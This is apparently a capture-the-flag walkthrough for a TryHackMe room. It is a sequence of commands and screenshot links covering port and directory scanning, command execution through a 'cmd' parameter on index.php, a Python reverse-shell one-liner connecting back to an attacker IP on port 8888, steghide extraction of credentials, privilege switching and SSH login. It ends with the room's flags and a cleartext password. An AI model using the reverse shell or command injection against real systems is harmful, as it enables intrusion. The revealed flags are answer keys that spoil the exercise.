```bash
nmap -F 0.0.0.0
```

![[Captura desde 2024-09-07 20-00-04.png]]

```bash
dirb http://0.0.0.0
```

![[Captura desde 2024-09-08 10-37-24.png]]

```bash
http://10.10.130.46/assets/index.php?cmd=ls
```

![[Captura desde 2024-09-08 10-46-24.png]]

```bash
echo 'aW1hZ2VzCmluZGV4LnBocApzdHlsZXMuY3NzCg==' | base64 -d
```

![[Captura desde 2024-09-08 11-38-08.png]]

![[Captura desde 2024-09-08 11-37-27.png]]

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.195.83",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

```bash
nc -lvnp 8888
```

![[Captura desde 2024-09-08 11-47-28.png]]

`AllmightForEver!!!`

![[Captura desde 2024-09-08 11-52-24.png]]

```bash
wget http://0.0.0.0/assets/images/oneforall.jpg
```

```bash
exiftool oneforall.jpg
```

![[Captura desde 2024-09-08 20-28-54.png]]

`https://en.wikipedia.org/wiki/List_of_file_signatures`

![[Captura desde 2024-09-08 20-34-58.png]]

save the file

```bash
steghide extract -sf oneforall.jpg -p 'AllmightForEver!!!'
```

![[Captura desde 2024-09-08 20-36-53.png]]

Username: `deku`
Password: `One?For?All_!!one1/A`

go back to reverse shell run it again and enter this command

```bash
su deku
```

```bash
cat user.txt
```

![[Captura desde 2024-09-08 20-46-43.png]]

**flag: `THM{W3lC0m3_D3kU_1A_0n3f0rAll??}`**

Username: `deku`
Password: `One?For?All_!!one1/A`

```bash
ssh deku@0.0.0.0 -p 22
```

![[Captura desde 2024-09-09 10-22-01.png]]

**flag: `THM{Y0U_4r3_7h3_NUm83r_1_H3r0}`**